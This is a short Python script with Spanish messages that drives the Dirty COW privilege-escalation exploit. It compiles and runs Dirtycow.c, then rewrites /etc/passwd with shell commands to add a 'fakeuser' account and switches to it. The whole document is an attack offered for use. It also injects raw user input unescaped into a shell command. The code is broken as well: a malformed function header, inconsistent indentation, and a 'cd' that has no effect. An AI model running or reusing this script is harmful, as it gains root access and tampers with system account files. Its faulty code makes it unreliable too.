def PruebaDirtyCow()
import os
  		DirtycowPath='/home/user1files/Dirtycow.c'
  		Compilar = 'gcc -pthread ' + DirtycowPath + ' -o /home/user1files/dirtyCow -lcrypt'
  		os.system(Compilar)
  		print('Compilando y ejecutando DirtyCow.c ...')
  		os.system('ls -l')
  		os.system('./dirtyCow password')
  		print('El archivo passwd.bak se ha copiado a /tmp/passwd.bak')
  		linea_generada = raw_input('Ingrese la linea de usuario generada por el Dirty Cow: ')
  		os.system('sudo mv /tmp/passwd.bak /etc/passwd')
  		os.system('cd /etc/')
  		linea = '"' + linea_generada + '"'
  		os.system('sudo cp /etc/passwd /etc/passwd.txt')
os.system('echo ' + linea + ' >> passwd.txt')
  		os.system('sudo rm -rf /etc/passwd')
  		os.system('sudo mv /etc/passwd.txt /etc/passwd')
  		os.system('su fakeuser')
PruebaDirtyCow()
